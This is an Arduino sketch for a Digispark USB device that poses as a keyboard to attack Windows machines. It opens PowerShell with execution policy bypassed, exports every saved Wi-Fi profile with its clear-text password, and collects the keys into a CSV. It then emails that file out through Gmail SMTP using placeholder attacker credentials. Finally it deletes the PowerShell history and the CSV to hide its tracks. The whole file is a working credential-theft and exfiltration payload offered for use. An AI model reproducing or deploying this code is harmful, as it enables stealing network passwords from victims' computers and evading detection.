#include "DigiKeyboard.h"

void setup() {
}

char mode[] = "powershell -nop -exec bypass";
char separator[] = "read-host";

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(mode);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd $env:temp");  // Opening temporary folder
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("netsh wlan export profile key=clear"); // Downloading wifi passwords
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > temp.csv"); // Collating them in a .csv
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

  DigiKeyboard.print(F("$email = \"FROM EMAIL\";"));  // From email address
  DigiKeyboard.print(F("$addressee = \"TO EMAIL\";")); // To email address
  DigiKeyboard.print(F("$tempcsv = \"$env:temp\\temp.csv\";"));  // o lugar onde vai salvar as senhas
  DigiKeyboard.print(F("$pass = \"PASSWORD\";"));   // Your account password
  DigiKeyboard.print(F("$smtpServer = \"smtp.gmail.com\";"));
  DigiKeyboard.print(F("$port = \"587\";"));
  
  DigiKeyboard.print(F("$securestring = $pass | ConvertTo-SecureString -AsPlainText -Force;"));
  DigiKeyboard.print(F("$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $email, $securestring;"));
  DigiKeyboard.print(F("$msg = new-object Net.Mail.MailMessage;"));
  DigiKeyboard.print(F("$smtp = new-object Net.Mail.SmtpClient($smtpServer, $port);"));
  DigiKeyboard.print(F("$smtp.EnableSsl = $true;"));
  DigiKeyboard.print(F("$msg.From = \"$email\";"));
  DigiKeyboard.print(F("$msg.To.Add(\"$addressee\");"));
  DigiKeyboard.print(F("$msg.Attachments.Add(\"$tempcsv\");"));
  DigiKeyboard.print(F("$msg.BodyEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboard.print(F("$msg.SubjectEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboard.print(F("$msg.IsBodyHTML = $true ;"));
  DigiKeyboard.print(F("$msg.Subject = \"WIFI Passwords\";"));
  DigiKeyboard.print(F("$msg.Body = \"<h2> Here are your wifi passwords </h2></br>Look at this file...\"; "));
  DigiKeyboard.print(F("$SMTP.Credentials = $cred;")); // Connecting to GMAIL server
  DigiKeyboard.print(F("$smtp.Send($msg);")); // GMAIL server port
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(separator);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(mode);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("rm \"$env:temp\\temp.csv\"")); // Deleting tracks from your PC
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(separator);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
